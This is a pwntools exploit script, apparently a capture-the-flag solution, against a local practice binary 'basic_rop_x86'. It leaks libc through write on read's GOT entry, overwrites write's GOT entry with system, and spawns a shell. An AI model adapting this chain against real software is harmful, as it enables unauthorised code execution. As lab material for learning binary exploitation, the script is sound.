from pwn import *

p = process('./basic_rop_x86', env = {"LD_PRELOAD" : "./libc.so.6"})
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b'/bin/sh'))[0]

pppr = 0x08048689
ret = 0x080483c2
bss = e.bss()

payload = b'A' * 0x40

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += p32(ret)
payload += p32(bss)

p.send(payload)

p.recvuntil(b'A'*64)
read = u32(p.recvn(4))
lb = read - read_offset
system = lb + system_offset
binsh = lb + binsh_offset
p.send(p32(binsh))
p.sendline(p32(system))
p.interactive()

